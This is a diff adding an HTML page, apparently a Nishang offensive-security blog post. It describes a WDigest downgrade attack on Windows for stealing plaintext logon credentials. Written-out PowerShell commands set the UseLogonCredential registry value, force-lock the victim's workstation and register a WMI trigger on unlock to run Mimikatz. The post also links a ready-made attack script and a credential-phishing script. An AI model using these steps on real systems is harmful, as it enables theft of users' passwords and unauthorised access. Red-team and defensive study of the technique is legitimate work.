@@ -1,0 +1,42 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>WDigest</title>
+</head><body>1. Create the registry key property "UseLogonCredential" at HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest and set its value to 1.<br/>
+2. Lock the target computer.<br/>
+3. Run Mimikatz when a user logs in.<br/>
+<br/>
+Simple, isn't it? We can use PowerShell to easily achieve the above steps. <br/>
+<br/>
+Registry key property can be created with:<br/>
+<br/>
+PS C:\&gt; New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1<br/>
+<br/>
+Lock workstation with PowerShell<br/>
+PS C:\&gt; Function Lock-WorkStation {<br/>
+$signature = @"<br/>
+[DllImport("user32.dll", SetLastError = true)]<br/>
+public static extern bool LockWorkStation();<br/>
+"@<br/>
+$LockWorkStation = Add-Type -memberDefinition $signature -name "Win32LockWorkStation" -namespace Win32Functions -passthru<br/>
+$LockWorkStation::LockWorkStation() | Out-Null<br/>
+}<br/>
+Lock-WorkStation<br/>
+<br/>
+Computer unlock event:<br/>
+PS C:\&gt; Register-wmievent -query "SELECT * FROM Win32_ProcessStopTrace WHERE ProcessName = 'LogonUI.exe'" -Action $actionblock<br/>
+<br/>
+<br/>
+bove could be assembled in a PowerShell script for easy use. Let me give you <b>Invoke-MimikatzWdigestDowngrade.ps1. The name is too long for a single script but I like it :) It uses Invoke-Mimikatz from PowerSploit (thanks to @JoesphBialek and @gentilkiwi for that). Invoke-MimikatzWdigestDowngrade is <a href="https://github.com/samratashok/nishang/blob/master/Gather/Invoke-MimikatzWDigestDowngrade.ps1">available here in the github repo</a>&nbsp;of Nishang. <br/>
+</b><b><br/>
+<br/>
+</b><b>Things to note/Meh!</b>&nbsp;<b>:</b><br/>
+<ul><li>This script makes changes to the target by adding a registry key property and the setting is removed after the script execution. Administrative privileges required</li>
+<li>User interaction is required as it is the user who unlocks the machine. We can use Invoke-CredentialsPhish as well - <a href="https://github.com/samratashok/nishang/blob/master/Gather/Invoke-CredentialsPhish.ps1">https://github.com/samratashok/nishang/blob/master/Gather/Invoke-CredentialsPhish.ps1</a></li>
+<li>We are forcing a machine lock on the user. Really noisy and suspicious.  </li>
+<li>Credentials are available in plain with WDigest for the entire length of the current session. </li>
+<li>There are surely other ways of doing this: <a href="https://twitter.com/gentilkiwi/status/594159340338151424">https://twitter.com/gentilkiwi/status/594159340338151424</a></li>
+<li>A better version of this code would be out soon. I will update this code accordingly.  <a href="https://twitter.com/subTee/status/594374626194534400">https://twitter.com/subTee/status/594374626194534400</a> </li>
+</ul>
+</body></html>
